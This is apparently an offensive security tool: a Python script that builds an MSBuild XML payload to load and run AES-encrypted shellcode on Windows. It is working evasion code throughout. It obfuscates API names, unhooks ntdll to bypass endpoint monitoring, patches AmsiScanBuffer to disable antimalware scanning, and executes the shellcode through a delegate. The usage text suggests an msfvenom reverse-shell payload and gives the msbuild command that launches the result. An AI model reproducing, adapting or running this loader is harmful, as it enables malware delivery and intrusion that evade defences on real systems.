# Author: kymb0

import os
import random
import string
import sys
from Crypto.Cipher import AES

rawkey = bytearray(os.urandom(16))
key = '{' + ','.join('0x{:02x}'.format(x) for x in rawkey) + '}' 
rawiv = bytearray(os.urandom(16))
iv = '{' + ','.join('0x{:02x}'.format(x) for x in rawiv) + '}' 

#if you are getting memory errors at compilation/runtime with msbuild try msfvenom with -o instead of >
if len(sys.argv) < 2:
	print("Usage: script.py payload.bin")
	print("Example payloads:\n    msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > shell.bin")
	exit(0)

functions = {"LoadLibrary", "CreateThread", "VirtualAlloc","WaitForSingleObject","GetProcAddress","VirtualProtect","RtlMoveMemory","AmsiScanBuffer","WaitForSingleObject","GetCurrentProcess", "GetModuleHandleW", "GetModuleInformation", "CreateFileA", "CreateFileMappingW", "MapViewOfFile", "FreeLibrary", "CloseHandle"}


dlls = {"kernel32","ntdll","amsi","psapi"}
strings = {"Key","IV","hThread","hThreadId","pinfo","funcAddr","decryptedS","cipherText","encryptedstring","decryptstring","DecryptAES","EShellcode","DShellcode","ptr1","ptr2","ptr3","ptr4","ptr5","ptr6","ptr7","ptr8","ptr9","ptr10","ptr11","ptr12","ptr13","ptr14","ptr15","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s"}

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size).encode(encoding="utf-8")

def aesenc(payload, key):
        payload = pad(payload)
        cipher = AES.new(rawkey, AES.MODE_CBC, rawiv)
        return cipher.encrypt(payload)

for s in functions:
	globals()['%s' %s] = (''.join(random.choices(string.ascii_lowercase, k=10)))
	globals()['%s_dec' %s] = (''.join(random.choices(string.ascii_lowercase, k=10)))
	globals()['%s_raw' %s] = (s.encode(encoding="utf-8"))
	globals()['%s_enc' %s] = '{' + ','.join('0x{:02x}'.format(x) for x in aesenc(globals()['%s_raw' %s], rawkey)) + '}'
	
for s in dlls:
	globals()['%s' %s] = (''.join(random.choices(string.ascii_lowercase, k=10)))
	globals()['%s_dec' %s] = (''.join(random.choices(string.ascii_lowercase, k=10)))
	globals()['%s_raw' %s] = (('%s.dll' %s).encode(encoding="utf-8"))
	globals()['%s_enc' %s] = '{' + ','.join('0x{:02x}'.format(x) for x in aesenc(globals()['%s_raw' %s], rawkey)) + '}'

for s in strings:
	globals()['%s' %s] = (''.join(random.choices(string.ascii_lowercase, k=10)))     

nt_path = "C:\\\\Windows\\\\System32\\\\ntdll.dll"
nt_path_raw = (nt_path.encode(encoding="utf-8"))
nt_path_enc = '{' + ','.join('0x{:02x}'.format(x) for x in aesenc(nt_path_raw, rawkey)) + '}'

shellcode_ingested = open(sys.argv[1], "rb").read()
AES_Shellcode = '{' + ','.join('0x{:02x}'.format(x) for x in aesenc(shellcode_ingested, rawkey)) + '}' 

xml=f'''
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
	  <Target Name="Forest">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	      <Code Type="Class" Language="cs">
	      <![CDATA[
        using System;
        using System.IO;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Cryptography;
        using System.Text;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
        {{

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DATA_DIRECTORY
            {{
                public UInt32 VirtualAddress;
                public UInt32 Size;
            }}
            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_OPTIONAL_HEADER64
            {{
                [FieldOffset(0)]
                public ushort Magic;

                [FieldOffset(2)]
                public byte MajorLinkerVersion;

                [FieldOffset(3)]
                public byte MinorLinkerVersion;

                [FieldOffset(4)]
                public uint SizeOfCode;

                [FieldOffset(8)]
                public uint SizeOfInitializedData;

                [FieldOffset(12)]
                public uint SizeOfUninitializedData;

                [FieldOffset(16)]
                public uint AddressOfEntryPoint;

                [FieldOffset(20)]
                public uint BaseOfCode;

                [FieldOffset(24)]
                public ulong ImageBase;

                [FieldOffset(32)]
                public uint SectionAlignment;

                [FieldOffset(36)]
                public uint FileAlignment;

                [FieldOffset(40)]
                public ushort MajorOperatingSystemVersion;

                [FieldOffset(42)]
                public ushort MinorOperatingSystemVersion;

                [FieldOffset(44)]
                public ushort MajorImageVersion;

                [FieldOffset(46)]
                public ushort MinorImageVersion;

                [FieldOffset(48)]
                public ushort MajorSubsystemVersion;

                [FieldOffset(50)]
                public ushort MinorSubsystemVersion;

                [FieldOffset(52)]
                public uint Win32VersionValue;

                [FieldOffset(56)]
                public uint SizeOfImage;

                [FieldOffset(60)]
                public uint SizeOfHeaders;

                [FieldOffset(64)]
                public uint CheckSum;

                [FieldOffset(68)]
                public ushort Subsystem;

                [FieldOffset(70)]
                public ushort DllCharacteristics;

                [FieldOffset(72)]
                public ulong SizeOfStackReserve;

                [FieldOffset(80)]
                public ulong SizeOfStackCommit;

                [FieldOffset(88)]
                public ulong SizeOfHeapReserve;

                [FieldOffset(96)]
                public ulong SizeOfHeapCommit;

                [FieldOffset(104)]
                public uint LoaderFlags;

                [FieldOffset(108)]
                public uint NumberOfRvaAndSizes;

                [FieldOffset(112)]
                public IMAGE_DATA_DIRECTORY ExportTable;

                [FieldOffset(120)]
                public IMAGE_DATA_DIRECTORY ImportTable;

                [FieldOffset(128)]
                public IMAGE_DATA_DIRECTORY ResourceTable;

                [FieldOffset(136)]
                public IMAGE_DATA_DIRECTORY ExceptionTable;

                [FieldOffset(144)]
                public IMAGE_DATA_DIRECTORY CertificateTable;

                [FieldOffset(152)]
                public IMAGE_DATA_DIRECTORY BaseRelocationTable;

                [FieldOffset(160)]
                public IMAGE_DATA_DIRECTORY Debug;

                [FieldOffset(168)]
                public IMAGE_DATA_DIRECTORY Architecture;

                [FieldOffset(176)]
                public IMAGE_DATA_DIRECTORY GlobalPtr;

                [FieldOffset(184)]
                public IMAGE_DATA_DIRECTORY TLSTable;

                [FieldOffset(192)]
                public IMAGE_DATA_DIRECTORY LoadConfigTable;

                [FieldOffset(200)]
                public IMAGE_DATA_DIRECTORY BoundImport;

                [FieldOffset(208)]
                public IMAGE_DATA_DIRECTORY IAT;

                [FieldOffset(216)]
                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

                [FieldOffset(224)]
                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

                [FieldOffset(232)]
                public IMAGE_DATA_DIRECTORY Reserved;
            }}
            [StructLayout(LayoutKind.Explicit, Size = 20)]
            public struct IMAGE_FILE_HEADER
            {{
                [FieldOffset(0)]
                public UInt16 Machine;
                [FieldOffset(2)]
                public UInt16 NumberOfSections; //keep
                [FieldOffset(4)]
                public UInt32 TimeDateStamp;
                [FieldOffset(8)]
                public UInt32 PointerToSymbolTable;
                [FieldOffset(12)]
                public UInt32 NumberOfSymbols;
                [FieldOffset(16)]
                public UInt16 SizeOfOptionalHeader;
                [FieldOffset(18)]
                public UInt16 Characteristics;
            }}
            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DOS_HEADER
            {{
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
                public char[] e_magic;
                public UInt16 e_cblp; 
                public UInt16 e_cp; 
                public UInt16 e_crlc; 
                public UInt16 e_cparhdr;
                public UInt16 e_minalloc; 
                public UInt16 e_maxalloc;
                public UInt16 e_ss; 
                public UInt16 e_sp; 
                public UInt16 e_csum; 
                public UInt16 e_ip; 
                public UInt16 e_cs; 
                public UInt16 e_lfarlc; 
                public UInt16 e_ovno; 
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
                public UInt16[] e_res1; 
                public UInt16 e_oemid; 
                public UInt16 e_oeminfo; 
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
                public UInt16[] e_res2;
                public Int32 e_lfanew;  

                private string _e_magic
                {{
                    get {{ return new string(e_magic); }}
                }}

                public bool isValid
                {{
                    get {{ return _e_magic == "MZ"; }}
                }}
            }}
            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_NT_HEADERS64
            {{
                [FieldOffset(0)]
                public int Signature;

                [FieldOffset(4)]
                public IMAGE_FILE_HEADER FileHeader;

                [FieldOffset(24)]
                public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
            }}
            [StructLayout(LayoutKind.Sequential)]
            public struct MODULEINFO
            {{
                public IntPtr lpBaseOfDll;
                public uint SizeOfImage;
                public IntPtr EntryPoint;
            }}
            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_SECTION_HEADER
            {{
                [FieldOffset(0)]
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                public char[] Name;

                [FieldOffset(8)]
                public UInt32 VirtualSize;

                [FieldOffset(12)]
                public UInt32 VirtualAddress;

                [FieldOffset(16)]
                public UInt32 SizeOfRawData;

                [FieldOffset(20)]
                public UInt32 PointerToRawData;

                [FieldOffset(24)]
                public UInt32 PointerToRelocations;

                [FieldOffset(28)]
                public UInt32 PointerToLinenumbers;

                [FieldOffset(32)]
                public UInt16 NumberOfRelocations;

                [FieldOffset(34)]
                public UInt16 NumberOfLinenumbers;

                [FieldOffset(36)]
                public uint Characteristics;

                public string Section
                {{
                    get {{ return new string(Name); }}
                }}
            }}  

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
            public delegate bool clsh
            (IntPtr hObject);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool frlb
            (IntPtr hModule);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr mpvfl
            (IntPtr hFileMappingObject, uint dwDesiredAccess, UInt32 dwFileOffsetHigh, UInt32 dwFileOffsetLow, IntPtr dwNumberOfBytesToMap);

            
            [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
            public delegate IntPtr crtflmp
            (IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, [MarshalAs(UnmanagedType.LPStr)] string lpName);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall,  SetLastError = true)]
            public delegate IntPtr crtfla
            (string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall,  SetLastError = true)]
            public delegate bool getmodinf
            (IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
            public delegate IntPtr getmodh
            (string lpModuleName);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr getprc
            ();

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr mvmem
            (IntPtr dest, IntPtr src, UInt32 count);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate IntPtr vproc
            (IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr mvmem2
            (IntPtr dest, IntPtr src, int size);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate IntPtr vproc2
            (IntPtr lpAddress, uint dwSize,
                    uint flNewProtect, IntPtr lpflOldProtect);
                    
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	    public delegate IntPtr {VirtualAlloc_dec}(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    	    
    	    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	    public delegate UInt32 {WaitForSingleObject_dec}(IntPtr hHandle,UInt32 dwMilliseconds);
    	    
    	    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	    public delegate IntPtr {CreateThread_dec}(UInt32 lpThreadAttributes,UInt32 dwStackSize,IntPtr lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);
    	private static UInt32 MEM_COMMIT = 0x1000;
    	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    	    delegate UInt32 {o}();

            public override bool Execute()
            {{
            
          	byte[] {VirtualProtect} = {VirtualProtect_enc};
	    string {VirtualProtect_dec} = {decryptstring}({VirtualProtect});	

            byte[] {RtlMoveMemory} = {RtlMoveMemory_enc};
	    string {RtlMoveMemory_dec} = {decryptstring}({RtlMoveMemory});
	    
	    byte[] {amsi} = {amsi_enc};
	    string {amsi_dec} = {decryptstring}({amsi});
	    
	    byte[] {AmsiScanBuffer} = {AmsiScanBuffer_enc};
	    string {AmsiScanBuffer_dec} = {decryptstring}({AmsiScanBuffer});
	    
	    byte[] {kernel32} = {kernel32_enc};
	    string {kernel32_dec} = {decryptstring}({kernel32});
	    
	    byte[] {ntdll} = {ntdll_enc};
	    string {ntdll_dec} = {decryptstring}({ntdll});
	    
	    byte[] {psapi} = {psapi_enc};
	    string {psapi_dec} = {decryptstring}({psapi});
	    
	    byte[] {GetCurrentProcess} = {GetCurrentProcess_enc};
	    string {GetCurrentProcess_dec} = {decryptstring}({GetCurrentProcess});
	    
	    byte[] {GetModuleHandleW} = {GetModuleHandleW_enc};
	    string {GetModuleHandleW_dec} = {decryptstring}({GetModuleHandleW});
	    
	    byte[] {GetModuleInformation} = {GetModuleInformation_enc};
	    string {GetModuleInformation_dec} = {decryptstring}({GetModuleInformation});
	    
	    byte[] {CreateFileA} = {CreateFileA_enc};
	    string {CreateFileA_dec} = {decryptstring}({CreateFileA});
	    
	    byte[] {CreateFileMappingW} = {CreateFileMappingW_enc};
	    string {CreateFileMappingW_dec} = {decryptstring}({CreateFileMappingW});
	    
	    byte[] {MapViewOfFile} = {MapViewOfFile_enc};
	    string {MapViewOfFile_dec} = {decryptstring}({MapViewOfFile});
	    
	    byte[] {FreeLibrary} = {FreeLibrary_enc};
	    string {FreeLibrary_dec} = {decryptstring}({FreeLibrary});
	    
	    byte[] {CloseHandle} = {CloseHandle_enc};
	    string {CloseHandle_dec} = {decryptstring}({CloseHandle});
	    
	   byte[] {r} = {nt_path_enc};
	    string {s} = {decryptstring}({r});
	    
            IntPtr TargetDLL = LoadLibrary({amsi_dec});
            IntPtr {a} = GetProcAddress(TargetDLL, {AmsiScanBuffer_dec});
            IntPtr {b} = Marshal.AllocHGlobal(4);
            
            IntPtr {ptr1} = getPtr({kernel32_dec}, {VirtualProtect_dec});
            vproc vp = (vproc)Marshal.GetDelegateForFunctionPointer({ptr1}, typeof(vproc));

            IntPtr {ptr2} = getPtr({kernel32_dec}, {RtlMoveMemory_dec});
            mvmem mm = (mvmem)Marshal.GetDelegateForFunctionPointer({ptr2}, typeof(mvmem));

            IntPtr {ptr3} = getPtr({kernel32_dec}, {VirtualProtect_dec});
            vproc2 vp2 = (vproc2)Marshal.GetDelegateForFunctionPointer({ptr3}, typeof(vproc2));
            
            IntPtr {ptr4} = getPtr({kernel32_dec}, {RtlMoveMemory_dec});
            mvmem2 mm2 = (mvmem2)Marshal.GetDelegateForFunctionPointer({ptr4}, typeof(mvmem2));
            
            IntPtr {ptr8} = getPtr({kernel32_dec}, {GetCurrentProcess_dec});
            getprc gtp = (getprc)Marshal.GetDelegateForFunctionPointer({ptr8}, typeof(getprc));
            
            IntPtr {ptr9} = getPtr({kernel32_dec}, {GetModuleHandleW_dec});
            getmodh gtmh = (getmodh)Marshal.GetDelegateForFunctionPointer({ptr9}, typeof(getmodh));
            
            IntPtr {ptr10} = getPtr({psapi_dec}, {GetModuleInformation_dec});
            getmodinf gtmi = (getmodinf)Marshal.GetDelegateForFunctionPointer({ptr10}, typeof(getmodinf));
            
            IntPtr {ptr11} = getPtr({kernel32_dec}, {CreateFileA_dec});
            crtfla crtfl = (crtfla)Marshal.GetDelegateForFunctionPointer({ptr11}, typeof(crtfla));
            
            IntPtr {ptr12} = getPtr({kernel32_dec}, {CreateFileMappingW_dec});
            crtflmp crtflm = (crtflmp)Marshal.GetDelegateForFunctionPointer({ptr12}, typeof(crtflmp));
            
            IntPtr {ptr13} = getPtr({kernel32_dec}, {MapViewOfFile_dec});
            mpvfl mp = (mpvfl)Marshal.GetDelegateForFunctionPointer({ptr13}, typeof(mpvfl));
            
            IntPtr {ptr14} = getPtr({kernel32_dec}, {FreeLibrary_dec});
            frlb frl = (frlb)Marshal.GetDelegateForFunctionPointer({ptr14}, typeof(frlb));
            
            IntPtr {ptr15} = getPtr({kernel32_dec}, {CloseHandle_dec});
            clsh cls = (clsh)Marshal.GetDelegateForFunctionPointer({ptr15}, typeof(clsh));            
            
            ////////////////// UNHOOK
                IntPtr curProc = gtp();
                MODULEINFO modInfo;
                IntPtr handle = gtmh({ntdll_dec});
                gtmi(curProc, handle, out modInfo, 0x18);
                IntPtr dllBase = modInfo.lpBaseOfDll;
                string fileName = {s};
                IntPtr file = crtfl(fileName, 0x80000000, 0x00000001, IntPtr.Zero, 3, 0, IntPtr.Zero);
                IntPtr mapping = crtflm(file, IntPtr.Zero, 0x02 | 0x1000000, 0, 0, null);
                IntPtr mappedFile = mp(mapping, 0x0004, 0, 0, IntPtr.Zero);

                IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(dllBase, typeof(IMAGE_DOS_HEADER));
                IntPtr ptrToNt = (dllBase + dosHeader.e_lfanew);
                IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrToNt, typeof(IMAGE_NT_HEADERS64));
                for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
                {{
                    IntPtr ptrSectionHeader = (ptrToNt + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)));
                    IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((ptrSectionHeader + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)))), typeof(IMAGE_SECTION_HEADER));
                    string sectionName = new string(sectionHeader.Name);

                    if (sectionName.Contains("text"))
                    {{
                        uint oldProtect = 0;
                        IntPtr lpAddress = IntPtr.Add(dllBase, (int)sectionHeader.VirtualAddress);
                        IntPtr srcAddress = IntPtr.Add(mappedFile, (int)sectionHeader.VirtualAddress);
                        vp(lpAddress, sectionHeader.VirtualSize, 0x40, out oldProtect);
                        mm(lpAddress, srcAddress, sectionHeader.VirtualSize);
                    }}
                }}


                cls(curProc);
                cls(file);
                cls(mapping);
                frl(handle);
            //////////////// END UNHOOK
      
	    //////////////// PATCH
            vp2({a}, 0x0015, 0x40, {b});
            
            Byte[] xPatch = {{ 0x50, 0x8c, 0xf6 }};
            var xkey = "asfgkqpaldjdjhs";
            byte[] Patch = XORCipher(xPatch, xkey);
            
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            mm2({a}+ 0x001b, unmanagedPointer, Patch.Length);
            ///////////////// END PATCH
            
            ///////////////// RUNNER
            
            		byte[] {VirtualAlloc} = {VirtualAlloc_enc};
        	string {VirtualAlloc_dec} = {decryptstring}({VirtualAlloc});
        	
                        IntPtr {ptr5} = getPtr({kernel32_dec}, {VirtualAlloc_dec});
            {VirtualAlloc_dec} va = ({VirtualAlloc_dec})Marshal.GetDelegateForFunctionPointer({ptr5}, typeof({VirtualAlloc_dec}));

		byte[] {WaitForSingleObject} = {WaitForSingleObject_enc};
        	string {WaitForSingleObject_dec} = {decryptstring}({WaitForSingleObject});

            IntPtr {ptr6} = getPtr({kernel32_dec}, {WaitForSingleObject_dec});
        	{WaitForSingleObject_dec} wfso = ({WaitForSingleObject_dec})Marshal.GetDelegateForFunctionPointer({ptr6}, typeof({WaitForSingleObject_dec}));

		byte[] {CreateThread} = {CreateThread_enc};
        	string {CreateThread_dec} = {decryptstring}({CreateThread});

            IntPtr {ptr7} = getPtr({kernel32_dec}, {CreateThread_dec});
            {CreateThread_dec} ct = ({CreateThread_dec})Marshal.GetDelegateForFunctionPointer({ptr7}, typeof({CreateThread_dec}));


        	byte[] {EShellcode} = {AES_Shellcode};

        	byte[] {DShellcode} = {DecryptAES}({EShellcode});


		IntPtr {q} = va(0, (UInt32){DShellcode}.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        	Marshal.Copy({DShellcode}, 0, (IntPtr) {q}, {DShellcode}.Length);
            {o} {p} = ({o})Marshal.GetDelegateForFunctionPointer((IntPtr) {q}, typeof({o}));
                
            {p}();

        	////////////////////// END RUNNER

            return true;
        }}
                static IntPtr getPtr(string dllName, string funcName)
            {{

                IntPtr hModule = LoadLibrary(dllName);
                IntPtr Ptr = GetProcAddress(hModule, funcName);
                return Ptr;

            }}
        
                static byte[] XORCipher(byte[] xpatch, string xkey)
        {{
            int patchLen = xpatch.Length;
            int xkeyLen = xkey.Length;
            byte[] output = new byte[patchLen];

            for (int i = 0; i < patchLen; ++i)
            {{
                output[i] = (byte)(xpatch[i] ^ xkey[i]);
            }}

            return output;
        }}
        static byte[] {DecryptAES}(byte[] {cipherText})
    {{
        byte[] {Key} = {key};
        byte[] {IV} = {iv};
        byte[] aes_out = null;
        using (Aes aesAlg = Aes.Create())
        {{
            aesAlg.Key = {Key};
            aesAlg.IV = {IV};

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
            using (MemoryStream msDecrypt = new MemoryStream({cipherText}))
            {{
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {{
                    using (MemoryStream decryptedData = new MemoryStream())
                    {{
                        csDecrypt.CopyTo(decryptedData);
                        return decryptedData.ToArray();
                    }}
                }}
            }}
        }}
    }}

    static string {decryptstring}(byte[] {encryptedstring})
    {{
        byte[] {decryptedS} = {DecryptAES}({encryptedstring});
        var v = Encoding.Default.GetString({decryptedS});
        return v;
    }}
		}}   
    	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>
'''


open("payload.xml", "w").write(xml)

print("[*] Shellcode AES encrypted")
print("[*] Shellcode written to .xml")
print("[*] .xml file generated in current directory")
print("[*] How to run:")
print("[*] C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe payload.xml")
